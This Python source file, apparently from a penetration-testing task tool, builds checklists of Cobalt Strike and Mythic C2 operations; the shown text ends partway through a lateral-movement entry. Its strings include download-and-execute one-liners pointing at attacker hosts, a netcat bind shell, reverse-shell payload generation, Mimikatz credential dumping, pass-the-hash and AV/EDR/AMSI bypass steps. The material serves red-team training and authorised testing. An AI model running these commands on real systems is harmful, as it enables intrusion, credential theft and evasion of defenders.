"""
C2 Operations Plugin

Generates tasks for Command & Control framework operations including:
- Cobalt Strike operational techniques (20+ techniques)
- Mythic C2 framework operations (15+ techniques)
- Manual C2 alternatives (netcat, PowerShell, meterpreter)
- OPSEC considerations and evasion

Extracted from HackTricks: cobalt-strike.md, mythic.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class C2OperationsPlugin(ServicePlugin):
    """C2 framework operations plugin for Cobalt Strike and Mythic"""

    @property
    def name(self) -> str:
        return "c2-operations"

    @property
    def default_ports(self) -> List[int]:
        return []  # Manual trigger only

    @property
    def service_names(self) -> List[str]:
        return []  # Manual trigger only - no service detection

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Manual trigger only - C2 operations are user-initiated, not port-detected.
        User must explicitly request C2 operations tasks.
        """
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect if C2 operations plugin should suggest based on finding.

        NOTE: C2 setup is a strategic decision - lower confidence scores.
        User decides if C2 infrastructure is warranted.

        Args:
            finding: Finding dictionary with 'type' and 'description'
            profile: Optional TargetProfile for additional context

        Returns:
            Confidence score 0-100 (0 = don't activate, 100 = perfect match)
        """
        from ..core.constants import FindingTypes

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Medium confidence - Root/System shell (C2 might be useful)
        if finding_type in [FindingTypes.ROOT_SHELL, FindingTypes.SYSTEM_SHELL,
                           FindingTypes.ADMIN_SHELL]:
            return 60  # Lower confidence - user decides if C2 needed

        # Low - High privilege shell
        if finding_type == FindingTypes.HIGH_PRIVILEGE_SHELL:
            return 40

        # Low - Persistent access indicators
        if 'persistence' in description or 'maintain access' in description:
            return 50

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate C2 operations task tree.

        Args:
            target: Target hostname/IP
            port: Service port (unused for manual plugin)
            service_info: Additional context (e.g., {'framework': 'cobalt-strike'})

        Returns:
            Hierarchical task tree with Cobalt Strike and Mythic techniques
        """
        framework = service_info.get('framework', 'all')

        tasks = {
            'id': f'c2-operations-{target}',
            'name': f'C2 Operations - {target}',
            'type': 'parent',
            'children': []
        }

        # Add framework-specific or all tasks
        if framework in ['cobalt-strike', 'all']:
            tasks['children'].append(self._get_cobalt_strike_tasks(target))

        if framework in ['mythic', 'all']:
            tasks['children'].append(self._get_mythic_tasks(target))

        if framework == 'all':
            tasks['children'].append(self._get_manual_c2_alternatives(target))

        return tasks

    def _get_cobalt_strike_tasks(self, target: str) -> Dict[str, Any]:
        """Cobalt Strike operational techniques"""
        return {
            'id': f'cobalt-strike-{target}',
            'name': 'Cobalt Strike Operations',
            'type': 'parent',
            'children': [
                # Listeners
                {
                    'id': f'cs-listeners-{target}',
                    'name': 'Cobalt Strike Listeners',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cs-http-listener-{target}',
                            'name': 'HTTP/HTTPS Listener (C2 Direct)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create HTTP/HTTPS beacon listener for direct C2 communication',
                                'notes': '''
Steps:
1. Cobalt Strike → Listeners → Add/Edit
2. Select HTTP/HTTPS beacon type
3. Configure host and port
4. Set malleable C2 profile (OPSEC!)
5. Generate payload: Attacks → Packages → Windows Executable (S) (STAGELESS preferred)

OPSEC Considerations:
- Use stageless payloads to reduce network traffic
- Customize malleable C2 profile to blend with normal traffic
- Avoid default pipe names (msagent_####, status_####)
- Configure sleep_mask to encrypt beacon in memory
''',
                                'alternatives': [
                                    'Mythic HTTP C2 profile',
                                    'Metasploit windows/meterpreter/reverse_https',
                                    'PowerShell Empire HTTP listener',
                                    'Manual: netcat reverse shell (nc -lvnp 4444)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'C2', 'STEALTH', 'OPSEC'],
                                'next_steps': [
                                    'Generate payload with custom malleable profile',
                                    'Test payload against AV/EDR in lab',
                                    'Configure beacon callback interval (sleep command)',
                                    'Set up redirectors for OPSEC'
                                ]
                            }
                        },
                        {
                            'id': f'cs-smb-listener-{target}',
                            'name': 'SMB Beacon (Peer-to-Peer)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create SMB beacon for peer-to-peer communication through named pipes (no direct C2 contact)',
                                'notes': '''
Steps:
1. Cobalt Strike → Listeners → Add/Edit
2. Select SMB Beacon
3. Set pipe name (default: msagent_####, CHANGE THIS!)
4. Generate payload
5. Link to SMB beacon from another beacon: link [target] [pipename]

Use Case: Internal lateral movement without direct C2 traffic

OPSEC:
- Change default pipe name: set pipename "custom_name" in malleable profile
- Check existing pipes: ls \\\\.\\pipe\\
- Avoid named pipes that don't match legitimate software patterns
''',
                                'alternatives': [
                                    'Mythic TCP agent with link_tcp',
                                    'Metasploit windows/meterpreter/bind_tcp',
                                    'Manual: netcat bind shell (nc -lvnp 4444 -e cmd.exe)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'C2', 'LATERAL_MOVEMENT', 'STEALTH'],
                                'success_indicators': [
                                    'SMB listener created',
                                    'Beacon payload generated',
                                    'link command connects successfully from parent beacon'
                                ],
                                'failure_indicators': [
                                    'Named pipe access denied',
                                    'Firewall blocking SMB traffic',
                                    'EDR detecting named pipe creation'
                                ]
                            }
                        },
                        {
                            'id': f'cs-tcp-listener-{target}',
                            'name': 'TCP Beacon (Peer-to-Peer)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create TCP beacon listener for peer-to-peer communication over TCP socket',
                                'notes': '''
Steps:
1. Cobalt Strike → Listeners → Add/Edit
2. Select TCP Beacon
3. Set port (e.g., 4444)
4. Generate payload
5. Connect from another beacon: connect <ip> <port>

Use Case: Pivot through compromised hosts without direct C2 traffic
''',
                                'alternatives': [
                                    'SSH tunneling',
                                    'socat relay',
                                    'Manual: netcat relay'
                                ],
                                'tags': ['OSCP:LOW', 'C2', 'LATERAL_MOVEMENT']
                            }
                        }
                    ]
                },

                # Payload Generation
                {
                    'id': f'cs-payloads-{target}',
                    'name': 'Payload Generation & Hosting',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cs-exe-payload-{target}',
                            'name': 'Windows Executable (Stageless)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Generate stageless Windows executable beacon (preferred for OPSEC)',
                                'notes': '''
Steps:
1. Attacks → Packages → Windows Executable (S)
2. Select listener
3. Output type: Windows EXE, Windows DLL, or Service EXE
4. x64 payload preferred (x86 if targeting 32-bit systems)

OPSEC: Stageless payloads don't download second stage, reducing network IOCs

AV Bypass:
- Modify Artifact Kit to change signatures
- Run ThreatCheck on payload: .\\ThreatCheck.exe -f beacon.exe
- Obfuscate detected strings in Artifact Kit source
- Rebuild: cd /opt/cobaltstrike/artifact-kit && ./build.sh
- Copy to Windows: pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
- Load artifact.cna script in Cobalt Strike
''',
                                'alternatives': [
                                    'msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<IP> LPORT=443 -f exe -o beacon.exe',
                                    'Manual PowerShell reverse shell',
                                    'Mythic Apollo agent'
                                ],
                                'tags': ['OSCP:HIGH', 'PAYLOAD', 'OPSEC', 'AV_BYPASS']
                            }
                        },
                        {
                            'id': f'cs-hta-payload-{target}',
                            'name': 'HTA Application (HTML Application)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Generate HTA file for initial access via phishing or web delivery',
                                'command': 'mshta.exe http://<LHOST>/payload.hta',
                                'flag_explanations': {
                                    'mshta.exe': 'Microsoft HTML Application host (executes HTA files)',
                                    'http://<LHOST>/payload.hta': 'Remote HTA file URL'
                                },
                                'notes': '''
Steps:
1. Attacks → Packages → HTMLApplication
2. Select listener
3. Generate payload.hta
4. Host file: Attacks → Web Drive-by → Host File
5. Victim executes: mshta.exe http://attacker.com/payload.hta

Delivery Methods:
- Email phishing attachment
- Web drive-by download
- Social engineering link
''',
                                'alternatives': [
                                    'Macro-enabled Office document',
                                    'Shortcut file (.lnk) with PowerShell payload',
                                    'CHM (Compiled HTML Help) file'
                                ],
                                'tags': ['OSCP:MEDIUM', 'PAYLOAD', 'PHISHING']
                            }
                        },
                        {
                            'id': f'cs-scripted-delivery-{target}',
                            'name': 'Scripted Web Delivery',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Generate one-liner script to download and execute beacon from Cobalt Strike web server',
                                'notes': '''
Steps:
1. Attacks → Web Drive-by → Scripted Web Delivery (S)
2. Select format: PowerShell, Python, bitsadmin, regsvr32
3. Select listener
4. Execute one-liner on target

PowerShell Example:
powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://<LHOST>/a'))"

OPSEC: Modify ResourceKit PowerShell templates to bypass AMSI
''',
                                'alternatives': [
                                    'Manual PowerShell download: (New-Object Net.WebClient).DownloadFile("http://attacker/beacon.exe","C:\\temp\\beacon.exe")',
                                    'certutil.exe -urlcache -f http://attacker/beacon.exe beacon.exe',
                                    'bitsadmin /transfer job http://attacker/beacon.exe C:\\temp\\beacon.exe'
                                ],
                                'tags': ['OSCP:HIGH', 'PAYLOAD', 'DOWNLOAD']
                            }
                        }
                    ]
                },

                # Beacon Commands
                {
                    'id': f'cs-beacon-commands-{target}',
                    'name': 'Beacon Commands & Operations',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cs-execute-assembly-{target}',
                            'name': 'Execute .NET Assembly (execute-assembly)',
                            'type': 'command',
                            'metadata': {
                                'command': 'execute-assembly /path/to/SharpHound.exe -c All',
                                'description': 'Execute .NET assembly in memory (uses sacrificial process - NOISY)',
                                'flag_explanations': {
                                    'execute-assembly': 'Cobalt Strike command to run .NET binaries in-memory',
                                    '/path/to/SharpHound.exe': 'Path to .NET assembly on team server',
                                    '-c All': 'SharpHound argument to collect all data'
                                },
                                'notes': '''
WARNING: execute-assembly is NOISY - uses remote process injection

OPSEC Improvements:
1. InlineExecute-Assembly (same process): https://github.com/anthemtotheego/InlineExecute-Assembly
2. BOF.NET (Beacon Object File): https://github.com/CCob/BOF.NET
3. Use HelpColor aggressor script to identify stealthy alternatives

Common Assemblies:
- SharpHound.exe -c All (BloodHound collector)
- Seatbelt.exe -group=system (host enumeration)
- Rubeus.exe asktgt /user:admin /domain:corp.com /aes256:<hash> (Kerberos)
- SharpDPAPI.exe triage (credential extraction)

Note: tasks_max_size in malleable profile must be increased for assemblies >1MB
''',
                                'success_indicators': [
                                    'Assembly executes without errors',
                                    'Output returned to beacon console',
                                    'Files written to disk (if applicable)'
                                ],
                                'failure_indicators': [
                                    'EDR blocks process injection',
                                    'Assembly crashes or times out',
                                    'Access denied (insufficient privileges)'
                                ],
                                'alternatives': [
                                    'Upload executable to disk and run (less stealthy)',
                                    'BOF (Beacon Object File) version if available',
                                    'PowerShell version: Invoke-SharpHound',
                                    'Manual enumeration commands'
                                ],
                                'tags': ['OSCP:HIGH', 'NOISY', 'ENUM', 'POST_EXPLOIT']
                            }
                        },
                        {
                            'id': f'cs-powershell-import-{target}',
                            'name': 'Import PowerShell Module',
                            'type': 'command',
                            'metadata': {
                                'command': 'powershell-import /root/Tools/PowerView.ps1',
                                'description': 'Import PowerShell script into beacon session for later use',
                                'flag_explanations': {
                                    'powershell-import': 'Loads PowerShell script into beacon memory',
                                    '/root/Tools/PowerView.ps1': 'Path to PowerShell script on team server'
                                },
                                'notes': '''
Usage:
1. powershell-import /path/to/script.ps1
2. powershell Get-DomainUser -Identity admin (execute cmdlets from imported script)

OPSEC Considerations:
- Use 'powerpick' instead of 'powershell' to avoid PowerShell logging
- powerpick creates sacrificial process with UnmanagedPowerShell
- Modify ResourceKit templates to bypass AMSI

Common Scripts:
- PowerView.ps1 (domain enumeration)
- PowerUp.ps1 (privilege escalation)
- Invoke-Mimikatz.ps1 (credential theft)
''',
                                'alternatives': [
                                    'Upload script to disk and dot-source: . C:\\temp\\PowerView.ps1',
                                    'Download and execute in one-liner: IEX (New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")',
                                    'Use built-in Windows commands for enumeration'
                                ],
                                'tags': ['OSCP:HIGH', 'POWERSHELL', 'ENUM']
                            }
                        },
                        {
                            'id': f'cs-make-token-{target}',
                            'name': 'Create Token (make_token)',
                            'type': 'command',
                            'metadata': {
                                'command': 'make_token DOMAIN\\user password',
                                'description': 'Generate logon token to impersonate network user (LOGON32_LOGON_NEW_CREDENTIALS - type 9)',
                                'flag_explanations': {
                                    'make_token': 'Creates token for network impersonation',
                                    'DOMAIN\\user': 'Domain and username to impersonate',
                                    'password': 'User password (plaintext)'
                                },
                                'notes': '''
Use Cases:
- Lateral movement with known credentials
- Access network shares: ls \\\\computer_name\\c$
- Execute commands on remote systems

Revert: rev2self

Event Logging:
- Generates Event 4624: Logon Type 9 (LOGON32_LOGON_NEW_CREDENTIALS)
- Detectable by defenders monitoring unusual logon types

OPSEC:
- Prefer steal_token over make_token (no new logon event)
- Use token-store to cache tokens: token-store steal <pid>
''',
                                'success_indicators': [
                                    'Token created successfully',
                                    'Can access remote shares',
                                    'Network commands succeed with new identity'
                                ],
                                'failure_indicators': [
                                    'Invalid credentials',
                                    'Account locked out',
                                    'Access still denied (wrong permissions)'
                                ],
                                'alternatives': [
                                    'steal_token <pid> (steal from existing process)',
                                    'pth DOMAIN\\user <NTLM_hash> (pass-the-hash)',
                                    'runas /netonly /user:DOMAIN\\user cmd (manual Windows command)'
                                ],
                                'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'IMPERSONATION']
                            }
                        },
                        {
                            'id': f'cs-steal-token-{target}',
                            'name': 'Steal Token (steal_token)',
                            'type': 'command',
                            'metadata': {
                                'command': 'steal_token <pid>',
                                'description': 'Steal primary token from another process (clones current user token)',
                                'flag_explanations': {
                                    'steal_token': 'Duplicates token from specified process',
                                    '<pid>': 'Process ID to steal token from (find with ps command)'
                                },
                                'notes': '''
Workflow:
1. ps (list processes)
2. Identify target process running as desired user
3. steal_token <pid>
4. Perform network actions with stolen identity
5. rev2self (revert to original token)

OPSEC:
- More stealthy than make_token (no new logon event)
- Use token-store to cache: token-store steal <pid>
- Avoid cross-platform injection (x86 → x64 or vice versa)

Note: API clones current token, so beacon output shows "Impersonated <current_username>"
''',
                                'success_indicators': [
                                    'Token impersonated successfully',
                                    'Network actions succeed with new identity',
                                    'Beacon shows impersonated user'
                                ],
                                'failure_indicators': [
                                    'Access denied (insufficient privileges)',
                                    'Process no longer exists',
                                    'EDR blocks token theft'
                                ],
                                'alternatives': [
                                    'make_token DOMAIN\\user password',
                                    'Mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>',
                                    'Incognito: use incognito → list_tokens -u → impersonate_token DOMAIN\\user'
                                ],
                                'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'STEALTH']
                            }
                        },
                        {
                            'id': f'cs-pth-{target}',
                            'name': 'Pass-the-Hash (pth)',
                            'type': 'command',
                            'metadata': {
                                'command': 'pth DOMAIN\\user <NTLM_hash>',
                                'description': 'Pass-the-hash attack (patches LSASS memory - HIGH RISK if PPL enabled)',
                                'flag_explanations': {
                                    'pth': 'Pass-the-hash command',
                                    'DOMAIN\\user': 'Target domain and username',
                                    '<NTLM_hash>': 'NTLM hash (32 hex characters)'
                                },
                                'notes': '''
WARNING: Requires local admin privileges and patches LSASS memory (very noisy!)

Risks:
- LSASS patching detected by EDR
- Fails if Protected Process Light (PPL) enabled
- Generates security events

Safer Alternative - Mimikatz method:
1. mimikatz sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:"powershell -w hidden"
2. steal_token <pid> (steal token from spawned process)

Extract NTLM Hashes:
- mimikatz: sekurlsa::logonpasswords
- SharpDPAPI: dpapi::cred /in:C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Credentials\\
- hashdump (post-exploitation)
''',
                                'success_indicators': [
                                    'LSASS successfully patched',
                                    'Network access with hash credentials',
                                    'No EDR alerts triggered'
                                ],
                                'failure_indicators': [
                                    'PPL (Protected Process Light) enabled',
                                    'EDR blocks LSASS access',
                                    'Insufficient privileges (need local admin)'
                                ],
                                'alternatives': [
                                    'Mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>',
                                    'Impacket: psexec.py -hashes :<NTLM> DOMAIN/user@target',
                                    'CrackMapExec: crackmapexec smb target -u user -H <NTLM>'
                                ],
                                'tags': ['OSCP:MEDIUM', 'NOISY', 'LATERAL_MOVEMENT', 'REQUIRES_ADMIN']
                            }
                        },
                        {
                            'id': f'cs-lateral-movement-{target}',
                            'name': 'Lateral Movement (jump)',
                            'type': 'command',
                            'metadata': {
                                'command': 'jump psexec64 target-host listener',
                                'description': 'Lateral movement to another host using various methods',
                                'flag_explanations': {
                                    'jump': 'Lateral movement command',
                                    'psexec64': 'Method: PsExec via service (x64)',
                                    'target-host': 'Target hostname or IP',
                                    'listener': 'Cobalt Strike listener name'
                                },
                                'notes': '''
Available Methods:
- psexec / psexec64: Service Control Manager (creates service)
- psexec_psh: PowerShell one-liner via service (x86)
- winrm / winrm64: PowerShell via WinRM (port 5985/5986)
- wmi_msbuild: WMI with msbuild inline C# task (OPSEC best)

OPSEC Recommendation:
Use wmi_msbuild for most legitimate-looking lateral movement

Prerequisites:
- Admin credentials or token
- Target accessible via SMB/WinRM
- Firewall allows SMB (445) or WinRM (5985)

Alternative - Upload and execute manually:
1. upload C:\\Payloads\\beacon-smb.exe
2. remote-exec wmi target-host C:\\Windows\\beacon-smb.exe
''',
                                'success_indicators': [
                                    'Beacon spawned on target host',
                                    'New session appears in Cobalt Strike',
                                    'Check with: sessions'
                                ],
                                'failure_indicators': [
                                    'Access denied (need admin privileges)',
                                    'Firewall blocking SMB/WinRM',
                                    'AV/EDR blocking payload execution'
                                ],
                                'alternatives': [
                                    'Manual: psexec.py DOMAIN/user:password@target',
                                    'Manual: wmiexec.py DOMAIN/user:password@target',
                                    'Manual: evil-winrm -i target -u user -p password',
                                    'Upload beacon and execute: remote-exec wmi target cmd.exe'
                                ],
                                'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'NOISY']
                            }
                        },
                        {
                            'id': f'cs-socks-proxy-{target}',
                            'name': 'SOCKS Proxy (socks)',
                            'type': 'command',
                            'metadata': {
                                'command': 'socks 1080',
                                'description': 'Start SOCKS5 proxy on Cobalt Strike team server for pivoting',
                                'flag_explanations': {
                                    'socks': 'Start SOCKS proxy',
                                    '1080': 'Port to listen on team server'
                                },
                                'notes': '''
Usage:
1. beacon> socks 1080
2. Configure proxychains on Kali: echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
3. Pivot through beacon: proxychains nmap -sT -Pn target-internal-network

Use Cases:
- Access internal network segments
- Scan internal hosts
- Exploit internal services (RDP, SMB, HTTP)

Stop proxy: socks stop
''',
                                'alternatives': [
                                    'SSH tunneling: ssh -D 1080 user@pivot-host',
                                    'Metasploit: use auxiliary/server/socks_proxy',
                                    'Chisel: ./chisel server -p 8080 --reverse && ./chisel client server:8080 R:socks'
                                ],
                                'tags': ['OSCP:HIGH', 'PIVOTING', 'LATERAL_MOVEMENT']
                            }
                        }
                    ]
                },

                # OPSEC
                {
                    'id': f'cs-opsec-{target}',
                    'name': 'OPSEC & Evasion Techniques',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cs-malleable-c2-{target}',
                            'name': 'Malleable C2 Profiles',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Customize beacon traffic patterns to evade detection',
                                'notes': '''
Malleable C2 profiles customize:
- HTTP headers, URIs, and parameters
- User-Agent strings
- SSL certificates
- Process injection behavior
- Memory allocation patterns (avoid RWX)
- Sleep mask (encrypt beacon in memory)

Key OPSEC Settings:
1. Change default pipe names:
   - set pipename "legit_pipe_name";
   - set ssh_pipename "ssh_pipe_custom";

2. Avoid default process injection:
   - spawnto_x86 "C:\\Windows\\System32\\svchost.exe";
   - spawnto_x64 "C:\\Windows\\System32\\svchost.exe";

3. Configure sleep behavior:
   - sleep <seconds> <jitter%> (e.g., sleep 60 20)

4. Syscall method (bypass function hooks):
   - syscall-method direct/indirect/none

5. Encrypt beacon in memory:
   - Use custom sleep_mask BOF

Profile Repositories:
- https://github.com/rsmudge/Malleable-C2-Profiles
- https://github.com/threatexpress/malleable-c2

Test Profile:
./c2lint profile.profile
''',
                                'alternatives': [
                                    'Mythic C2 profiles (HTTP, HTTPS, DNS)',
                                    'Metasploit: set HttpUserAgent, HttpHostHeader',
                                    'Manual: Modify beacon traffic with redirectors/CDN'
                                ],
                                'tags': ['OSCP:LOW', 'OPSEC', 'STEALTH', 'EVASION']
                            }
                        },
                        {
                            'id': f'cs-artifact-kit-{target}',
                            'name': 'Artifact Kit (AV Bypass)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Modify Cobalt Strike payload templates to bypass AV detection',
                                'notes': '''
Workflow:
1. Identify signatures: ThreatCheck.exe -f beacon.exe
2. Modify Artifact Kit source: /opt/cobaltstrike/artifact-kit/src-common/
3. Change detected strings in templates
4. Rebuild: cd /opt/cobaltstrike/artifact-kit && ./build.sh
5. Copy to Windows: pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
6. Load in Cobalt Strike: Script Manager → Load → artifact.cna

Similarly for PowerShell:
1. Test: ThreatCheck.exe -e AMSI -f template.x64.ps1
2. Modify: /opt/cobaltstrike/ResourceKit/template.x64.ps1
3. Load: ResourceKit\\resources.cna

Obfuscation Techniques:
- String concatenation
- Variable name changes
- Encryption/encoding
- Code reordering
''',
                                'alternatives': [
                                    'Veil-Evasion framework',
                                    'Invoke-Obfuscation (PowerShell)',
                                    'Manual: msfvenom with custom encoder',
                                    'Donut shellcode loader'
                                ],
                                'tags': ['OSCP:MEDIUM', 'AV_BYPASS', 'EVASION']
                            }
                        },
                        {
                            'id': f'cs-unhook-bof-{target}',
                            'name': 'Unhook EDR (unhook-bof)',
                            'type': 'command',
                            'metadata': {
                                'command': 'unhook',
                                'description': 'Remove EDR function hooks from beacon process using BOF',
                                'notes': '''
EDR Hook Bypass:
- EDRs hook Windows API functions to monitor behavior
- unhook-bof removes those hooks from beacon process
- Allows malicious actions to bypass EDR monitoring

Install unhook-bof:
1. Download: https://github.com/Cobalt-Strike/unhook-bof
2. Load in Cobalt Strike
3. Execute: unhook

Check for Hooks:
- https://github.com/Mr-Un1k0d3r/EDRs
- https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector

Alternative: Syscall Method
- syscall-method direct (use Nt* functions directly)
- syscall-method indirect (jump over hooks)
''',
                                'alternatives': [
                                    'Direct syscalls in custom shellcode',
                                    'Manual unhooking via assembly',
                                    'Process hollowing to execute in clean process'
                                ],
                                'tags': ['OSCP:LOW', 'EVASION', 'EDR_BYPASS']
                            }
                        },
                        {
                            'id': f'cs-token-store-{target}',
                            'name': 'Token Store (Avoid Repeated Theft)',
                            'type': 'command',
                            'metadata': {
                                'command': 'token-store steal <pid>',
                                'description': 'Store stolen tokens per beacon to avoid repeated theft (OPSEC)',
                                'flag_explanations': {
                                    'token-store steal <pid>': 'Steal and store token',
                                    'token-store show': 'List stored tokens',
                                    'token-store use <id>': 'Use stored token',
                                    'token-store remove <id>': 'Remove token from store'
                                },
                                'notes': '''
Commands:
- token-store steal <pid>        # Steal and store
- token-store steal-and-use <pid> # Steal, store, and use
- token-store show                # List tokens
- token-store use <id>            # Apply stored token
- token-store remove <id>         # Delete token
- token-store remove-all          # Clear all tokens

OPSEC Benefit:
- Avoids repeated steal_token calls (reduces IOCs)
- Tokens stored per beacon session
- EDRs can detect multiple token thefts from same process

Warning: EDRs can enumerate tokens in beacon process and detect foreign tokens
''',
                                'alternatives': [
                                    'Manual token caching in custom implant',
                                    'Kerberos ticket caching',
                                    'Use credentials instead of tokens (make_token)'
                                ],
                                'tags': ['OSCP:LOW', 'OPSEC', 'STEALTH']
                            }
                        }
                    ]
                }
            ]
        }

    def _get_mythic_tasks(self, target: str) -> Dict[str, Any]:
        """Mythic C2 framework operations"""
        return {
            'id': f'mythic-{target}',
            'name': 'Mythic C2 Operations',
            'type': 'parent',
            'children': [
                # Installation
                {
                    'id': f'mythic-install-{target}',
                    'name': 'Mythic Installation & Setup',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Install Mythic C2 framework and agents',
                        'command': 'sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo',
                        'flag_explanations': {
                            'mythic-cli': 'Mythic command-line interface',
                            'install github': 'Install from GitHub repository',
                            'Apollo': 'Agent name (Windows C# agent)'
                        },
                        'notes': '''
Installation:
1. Clone Mythic: git clone https://github.com/its-a-feature/Mythic
2. Install: sudo ./mythic-cli install github https://github.com/MythicAgents/<agent>
3. Install C2 profile: sudo ./mythic-cli install github https://github.com/MythicC2Profiles/<profile>

Popular Agents:
- Apollo: Windows C# agent (similar to Cobalt Strike Beacon)
- Poseidon: Linux/macOS Golang agent
- Merlin: Cross-platform HTTP/2 agent

Popular C2 Profiles:
- HTTP/HTTPS
- DNS
- Slack
- Discord

Note: Agents can be installed while Mythic is running
''',
                        'alternatives': [
                            'Cobalt Strike',
                            'Metasploit Framework',
                            'Empire/Starkiller',
                            'Sliver C2'
                        ],
                        'tags': ['OSCP:LOW', 'C2', 'SETUP']
                    }
                },

                # Apollo Agent (Windows)
                {
                    'id': f'mythic-apollo-{target}',
                    'name': 'Apollo Agent (Windows)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'apollo-execute-assembly-{target}',
                            'name': 'Execute .NET Assembly',
                            'type': 'command',
                            'metadata': {
                                'command': 'execute_assembly /path/to/SharpHound.exe -c All',
                                'description': 'Execute .NET assembly in beacon context',
                                'notes': '''
Apollo Assembly Execution:
- execute_assembly: Executes in agent context
- assembly_inject: Injects assembly loader into remote process
- inline_assembly: Executes in disposable AppDomain (isolated)

OPSEC:
- inline_assembly preferred (doesn't affect main process)
- execute_assembly runs in current process
- assembly_inject is noisy (remote injection)

Common Assemblies:
- SharpHound.exe -c All (BloodHound)
- Seatbelt.exe -group=all
- Rubeus.exe triage
''',
                                'alternatives': [
                                    'Cobalt Strike: execute-assembly',
                                    'Upload and execute from disk',
                                    'PowerShell: [Reflection.Assembly]::Load(...)'
                                ],
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'ENUM']
                            }
                        },
                        {
                            'id': f'apollo-powershell-{target}',
                            'name': 'PowerShell Execution',
                            'type': 'command',
                            'metadata': {
                                'command': 'powerpick Get-DomainUser -Identity admin',
                                'description': 'Execute PowerShell without powershell.exe logging',
                                'flag_explanations': {
                                    'powerpick': 'Injects PowerShell loader into sacrificial process',
                                    'Get-DomainUser': 'PowerView cmdlet',
                                    '-Identity admin': 'Query for admin user'
                                },
                                'notes': '''
PowerShell Commands:
- powershell_import: Import .ps1 script
- powershell: Execute PowerShell command (uses powershell.exe)
- powerpick: Execute in sacrificial process (no PowerShell logging)
- psinject: Execute in specified process

OPSEC: powerpick avoids PowerShell ScriptBlock logging

Workflow:
1. powershell_import /root/Tools/PowerView.ps1
2. powerpick Get-DomainUser
''',
                                'alternatives': [
                                    'Direct PowerShell: powershell.exe -c "Get-DomainUser"',
                                    'Use shell command for basic tasks',
                                    'C# equivalent tools (SharpView)'
                                ],
                                'tags': ['OSCP:HIGH', 'POWERSHELL', 'STEALTH']
                            }
                        },
                        {
                            'id': f'apollo-privesc-{target}',
                            'name': 'Privilege Escalation',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': f'apollo-getsystem-{target}',
                                    'name': 'Get SYSTEM (getsystem)',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'getsystem',
                                        'description': 'Duplicate winlogon token to escalate to SYSTEM',
                                        'notes': 'Opens handle to winlogon.exe and duplicates token. Requires admin privileges.',
                                        'alternatives': [
                                            'psexec -s -i cmd.exe',
                                            'Named pipe impersonation',
                                            'Token stealing from SYSTEM process'
                                        ],
                                        'tags': ['OSCP:HIGH', 'PRIVESC', 'REQUIRES_ADMIN']
                                    }
                                },
                                {
                                    'id': f'apollo-make-token-{target}',
                                    'name': 'Create Logon Session (make_token)',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'make_token DOMAIN\\user password',
                                        'description': 'Create new logon session for impersonation',
                                        'alternatives': ['steal_token', 'pth'],
                                        'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT']
                                    }
                                },
                                {
                                    'id': f'apollo-pth-{target}',
                                    'name': 'Pass-the-Hash (pth)',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'pth DOMAIN\\user <NTLM_hash>',
                                        'description': 'Pass-the-hash for authentication',
                                        'notes': 'Requires NTLM hash. Use mimikatz or dcsync to obtain hashes.',
                                        'tags': ['OSCP:MEDIUM', 'LATERAL_MOVEMENT']
                                    }
                                },
                                {
                                    'id': f'apollo-mimikatz-{target}',
                                    'name': 'Mimikatz Commands',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'mimikatz sekurlsa::logonpasswords',
                                        'description': 'Run Mimikatz commands to extract credentials',
                                        'notes': '''
Common Mimikatz Commands:
- sekurlsa::logonpasswords (dump credentials from memory)
- sekurlsa::tickets (list Kerberos tickets)
- lsadump::sam (dump SAM database)
- lsadump::secrets (dump LSA secrets)
''',
                                        'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'REQUIRES_ADMIN']
                                    }
                                }
                            ]
                        },
                        {
                            'id': f'apollo-lateral-movement-{target}',
                            'name': 'Lateral Movement',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': f'apollo-jump-psexec-{target}',
                                    'name': 'PsExec Lateral Movement',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'jump_psexec target-host listener',
                                        'description': 'Lateral movement via PsExec (uploads apollo.exe and executes)',
